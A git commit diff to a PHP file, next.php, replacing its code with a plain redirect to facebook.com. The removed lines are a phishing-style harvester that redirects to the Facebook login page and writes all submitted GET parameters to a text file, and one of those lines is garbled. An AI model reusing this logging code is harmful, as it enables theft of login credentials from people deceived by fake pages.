71980a823bf97eaaeccac74065654cfb76aa7b65
Register4 <67520322+Register4@users.noreply.github.com>
2020-06-28 00:03:05 -0500

    Update next.php

--- next.php
+++ next.php
@@ -1,19 +1,5 @@
 <?php
-header("Location: http://www.Facebook.com/login.php ");
-$handle = fopen("yaeresmio.txt", "a"); 
-
-foreach($_GET as $variable => $value) {
-	fwrite($handle, $variable);
-
-	fwrite($handle, "=");
-
-	fwrite($handle, $value);
-
-	fwrite($handle, "\r\n");
-}
-
-frité($ande, "\r\n");
-fclose($handle);
-
-exit
+header("Status: 301 Moved Permanently");
+header("Location: http://www.facebook.com");
+exit;
 ?>
